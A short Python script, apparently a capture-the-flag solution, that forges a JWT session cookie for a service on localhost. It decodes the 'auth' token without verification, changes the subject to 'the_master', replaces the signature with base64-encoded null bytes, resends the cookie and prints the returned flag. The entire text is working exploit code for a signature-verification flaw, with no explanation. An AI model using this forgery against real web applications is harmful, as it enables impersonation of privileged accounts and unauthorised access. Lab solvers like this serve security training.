#!/usr/bin/env python3

import base64
import requests
import jwt

BASE_URL = 'http://localhost:8080'

s = requests.Session()
s.get(BASE_URL)
auth_cookie = s.cookies['auth']
auth_data = jwt.decode(auth_cookie, options={"verify_signature": False})

auth_data['sub'] = 'the_master'
key = b'does_not_matter'
auth_cookie2 = jwt.encode(auth_data, key, algorithm="HS256")
auth_parts = auth_cookie2.split('.')

auth_parts[-1] = base64.b64encode(b'\0'*2).decode()
auth_cookie3 = '.'.join(auth_parts)
s.cookies['auth'] = auth_cookie3
r = s.get(BASE_URL)

print(f'Flag: {r.text}')
